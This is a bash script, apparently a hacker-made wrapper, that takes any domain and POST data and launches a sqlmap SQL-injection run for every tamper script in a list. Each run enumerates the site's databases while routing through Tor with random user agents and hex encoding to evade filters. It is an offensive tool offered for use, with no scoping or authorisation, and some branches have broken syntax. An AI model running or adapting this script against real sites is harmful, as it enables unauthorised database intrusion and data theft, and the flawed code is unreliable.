#!/bin/bash
#LSMa$$ - F@$k ALL In One
pwd=$(pwd)
header(){
  printf """

 ██                                 ████     ████     ██     ███████
░██                         ██   ██░██░██   ██░██    ████   ░██░░░░██
░██        ██████   ██████ ░░██ ██ ░██░░██ ██ ░██   ██░░██  ░██   ░██
░██       ░░░░░░██ ░░░░██   ░░███  ░██ ░░███  ░██  ██  ░░██ ░███████
░██        ███████    ██     ░██   ░██  ░░█   ░██ ██████████░██░░░░
░██       ██░░░░██   ██      ██    ░██   ░    ░██░██░░░░░░██░██
░████████░░████████ ██████  ██     ░██        ░██░██     ░██░██
░░░░░░░░  ░░░░░░░░ ░░░░░░  ░░      ░░         ░░ ░░      ░░ ░░

      \e[1;38;5;197mdefulat : \e[0m\e[1;38;5;137m-v 3 --tor --batch --hex --level --risk\e[0m
  \e[1;37m
|   _ _
|__(_|/_\/Ass for sqlmap tampers
        /

"""
}
clear
header
printf """\e[1;38;5;197m#\e[0mOptions :
    ( \e[1;37m1\e[0m ) - for \e[1;38;5;120mGET\e[0m
    ( \e[1;37m2\e[0m ) - for \e[1;38;5;120mPOST\e[0m

"""
read -p $'\e[1;38;5;197m#\e[0m\e[1;37mNumber: \e[0m\e[1;38;5;120m' OPTnumber
if [[ $OPTnumber == '' ]] ; then echo Error \- numbers only 1 or 2 ..; sleep 0.5 ; $0 ; fi
if [[ $OPTnumber == '1' ]] ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mCustom or \e[1;38;5;197mdefulat \e[0m\e[1;38;5;137m-v 3 --tor --batch --hex --level --risk\e[0m  \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mHit Enter(defulat): \e[0m' OPTCorD ; if [[ $OPTCorD == '' ]]; then OPTDEF='--random-agent -v 3 --tor --batch --hex --level 1 --risk 1 --timeout 2 --threads 2 --time-sec 2' ; else OPTDEF=$OPTCorD ; fi ; read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSelect VERBOSE\e[0m :\n    ( \e[1;37m1\e[0m ) - for \e[1;38;5;120mFULL\e[0m\n    ( \e[1;37m2\e[0m ) - for \e[1;38;5;120mSHORT\e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mNumber: \e[0m' OPT1 ; if [[ $OPT1 == '' ]] ; then echo Error \- numbers only 1 or 2 ..; sleep 0.5 ; $0 ; fi ; if [[ $OPT1 == '1' ]] ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSELECTED [ GET AND FULL ] --> Enter domain now \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mDoamin: \e[0m' Domain ; for TAM in $(cat tamper.txt | sort); do exec 3>&1 ; sleep 1 ; cmd1="sqlmap -u \"$Domain\" --dbs $OPTDEF --tamper=$TAM" ; exec1=$(gnome-terminal --geometry=87x20 -- sh -c "echo \"[*] Target $Domain \" ; echo [*] tampers selected : $TAM ; $cmd1 ; ${SHELL:-bash}") ; exitcode=$? ; done ; fi ; if [[ $OPT1 == '2' ]] ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSELECTED [ GET AND SHORT ] --> Enter domain now \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mDoamin: \e[0m' Domain ; for TAM in $(cat tamper.txt | sort); do exec 3>&1 ; sleep 1 ; cmd1="sqlmap -u \"$Domain\" --dbs $OPTDEF --tamper=$TAM | egrep -i '(GET.+.appears.to.be|INFO.+.the.back-end.DBMS|back-end DBMS|web application technology|available databases|\[\*\]|it looks like the])'" ; exec1=$(gnome-terminal --geometry=87x20 -- sh -c "echo \"[*] Target $Domain \" ; echo [*] tampers selected : $TAM ; $cmd1 ; ${SHELL:-bash}") ; exitcode=$? ; done ; fi ; fi
if [[ $OPTnumber == '2' ]] ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mCustom or \e[1;38;5;197mdefulat \e[0m\e[1;38;5;137m-v 3 --tor --batch --hex --level --risk\e[0m  \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mHit Enter(defulat): \e[0m' OPTCorD2 ; if [[ $OPTCorD2 == '' ]]; then OPTDEF2='--random-agent -v 3 --tor --batch --hex --level 1 --risk 1 --timeout 2 --threads 2 --time-sec 2' ; else OPTDEF2=$OPTCorD2 ; fi ; read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSelect VERBOSE\e[0m :\n    ( \e[1;37m1\e[0m ) - for \e[1;38;5;120mFULL\e[0m\n    ( \e[1;37m2\e[0m ) - for \e[1;38;5;120mSHORT\e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mNumber: \e[0m' OPT2 ; if [[ $OPT2 == '' ]] ; then echo Error \- numbers only 1 or 2 ..; sleep 0.5 ; $0 ; fi ; if [[ $OPT2 == '1' ]] ; read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mEnter POST data \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mdata: \e[0m' postData ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSELECTED [ POST AND FULL ] --> Enter domain now \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mDoamin: \e[0m' Domain2 ; for TAM2 in $(cat tamper.txt | sort); do exec 3>&1 ; sleep 1 ; cmd2="sqlmap -u \"$Domain2\" --data=\"$postData\" --dbs $OPTDEF2 --tamper=$TAM2" ; exec2=$(gnome-terminal --geometry=87x20 -- sh -c "echo \"[*] Target $Domain2 \" ; echo [*] tampers selected : $TAM2 ; $cmd2 ; ${SHELL:-bash}") ; exitcode=$? ; done ; fi ; if [[ $OPT2 == '2' ]] ; then read -p $'\e[0m\e[1;38;5;197m#\e[0m\e[1;37mSELECTED [ POST AND SHORT ] --> Enter domain now \e[0m\n\e[1;38;5;197m#\e[0m\e[1;37mDoamin: \e[0m' Domain2 ; for TAM2 in $(cat tamper.txt | sort); do exec 3>&1 ; sleep 1 ; cmd2="sqlmap -u \"$Domain2\" --data=\"$postData\" --dbs $OPTDEF2 --tamper=$TAM2 | egrep -i '(GET.+.appears.to.be|INFO.+.the.back-end.DBMS|back-end DBMS|web application technology|available databases|\[\*\]|it looks like the])'" ; exec2=$(gnome-terminal --geometry=87x20 -- sh -c "echo \"[*] Target $Domain2 \" ; echo [*] tampers selected : $TAM2 ; $cmd2 ; ${SHELL:-bash}") ; exitcode=$? ; done ; fi ; fi
